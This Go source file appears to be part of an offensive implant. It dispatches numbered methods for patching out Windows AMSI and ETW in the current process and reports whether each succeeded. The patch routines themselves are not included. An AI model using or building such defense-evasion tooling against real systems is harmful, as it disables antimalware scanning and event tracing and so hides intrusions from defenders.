package main

import "errors"

func evadeAmsi(method string) ([]byte, error) {
    switch method {
    case "1":
		err := PatchAmsi()
		if err != nil {
			return []byte("Error in evading AMSI: " + err.Error()), err
		}
        return []byte("AMSI evaded successfully with method 1 in current process"), nil
    case "2":
		err := PatchAmsi2()
		if err != nil {
			return []byte("Error in evading AMSI: " + err.Error()), err
		}
        return []byte("AMSI evaded successfully with method 2 in current process"), nil
    case "3":
		err := PatchAmsi3()
		if err != nil {
			return []byte("Error in evading AMSI: " + err.Error()), err
		}
        return []byte("AMSI evaded successfully with method 3 in current process"), nil
    case "4":
		err := PatchAmsi4()
		if err != nil {
			return []byte("Error in evading AMSI: " + err.Error()), err
		}
        return []byte("AMSI evaded successfully with method 4 in current process"), nil
    case "5":
		err := PatchAmsi5()
		if err != nil {
			return []byte("Error in evading AMSI: " + err.Error()), err
		}
        return []byte("AMSI evaded successfully with method 5 in current process"), nil
    case "6":
		err := PatchAmsi6()
		if err != nil {
			return []byte("Error in evading AMSI: " + err.Error()), err
		}
        return []byte("AMSI evaded successfully with method 6 in current process"), nil
    case "7":
		err := PatchAmsi7()
		if err != nil {
			return []byte("Error in evading AMSI: " + err.Error()), err
		}
        return []byte("AMSI evaded successfully with method 7 in current process"), nil
    case "8":
        return []byte("Still Not Implemented - Researching HWBP Windows with Go runtime -"), nil
        
    }
    return []byte("Method Number not known"), errors.New("Method number not knows")
}

func evadeEtw(method string) (output []byte, err error) {
    switch method {
    case "1":
		err := PatchEtw()
		if err != nil {
			return []byte("Error in evading ETW: " + err.Error()), err
		}
        return []byte("ETW evaded successfully with method 1 in current process"), nil
    case "2":
		err := PatchEtw2()
		if err != nil {
			return []byte("Error in evading ETW: " + err.Error()), err
		}
        return []byte("ETW evaded successfully with method 2 in current process"), nil
    case "3":
		err := PatchEtw3()
		if err != nil {
			return []byte("Error in evading ETW: " + err.Error()), err
		}
        return []byte("ETW evaded successfully with method 3 in current process"), nil
    case "4":
		err := PatchEtw4()
		if err != nil {
			return []byte("Error in evading ETW: " + err.Error()), err
		}
        return []byte("ETW evaded successfully with method 4 in current process"), nil
    case "5":
        return []byte("Still Not Implemented - Researching HWBP Windows with Go runtime -"), nil
        
    }
    return []byte("Method Number not known"), errors.New("Method number not knows")
}
